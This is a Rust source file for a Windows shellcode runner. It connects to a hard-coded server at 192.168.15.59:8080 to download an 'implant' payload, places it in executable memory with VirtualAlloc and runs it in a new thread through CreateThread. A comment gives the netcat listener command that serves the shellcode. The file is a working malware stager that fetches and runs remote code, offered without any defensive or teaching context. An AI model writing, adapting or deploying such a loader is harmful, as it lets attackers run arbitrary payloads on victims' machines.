use std::ptr::null_mut;
use std::net::{Ipv4Addr, SocketAddrV4};
use std::io::Read;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use winapi::shared::minwindef::{DWORD, LPVOID};
use std::net::TcpStream;


// nc -lvp 8080 < FILE_SHELLCODE
const SERVER_IP: &str = "192.168.15.59";
const SERVER_PORT: u16 = 8080;

fn download_implant() -> Vec<u8> {
    let server_addr = SocketAddrV4::new(
        SERVER_IP.parse::<Ipv4Addr>().expect("Invalid IP address"),
        SERVER_PORT,
    );

    println!("Connecting server: {}:{}", SERVER_IP, SERVER_PORT);

    let mut stream = match TcpStream::connect(server_addr) {
        Ok(s) => {
            println!("Connected server.");
            s
        }
        Err(e) => {
            panic!("Failed connect server: {}", e);
        }
    };

    let mut buffer = Vec::new();
    match stream.read_to_end(&mut buffer) {
        Ok(size) => {
            if size == 0 {
                panic!("Received empty payload");
            }
            println!("Successfully received payload ({} bytes)", size);
        }
        Err(e) => {
            panic!("Failed connect from server: {}", e);
        }
    };

    buffer
}

unsafe extern "system" fn shellcode_runner(param: LPVOID) -> DWORD {
    println!("Starting shellcode execution...");
    let func: extern "C" fn() = std::mem::transmute(param);
    func();
    println!("Shellcode executed");
    0
}

fn main() {
    unsafe {
        println!("Starting shellcode runner...");

        // Download the shellcode
        let shellcode = download_implant();

        // Allocate memory for the shellcode
        let alloc = VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        if alloc.is_null() {
            panic!("VirtualAlloc failed");
        }

        println!("Allocated memory at: {:p}", alloc);

        // allocated memory
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), alloc as *mut u8, shellcode.len());
        println!("Shellcode copied to allocated memory");

        // exece shellcode
        let thread_handle = CreateThread(
            null_mut(),
            0,
            Some(shellcode_runner),
            alloc,
            0,
            null_mut(),
        );

        if thread_handle.is_null() {
            panic!("CreateThread failed");
        }

        println!("Shellcode execution thread created");

        WaitForSingleObject(thread_handle, winapi::um::winbase::INFINITE);
        println!("Shellcode execution complete");
    }
}
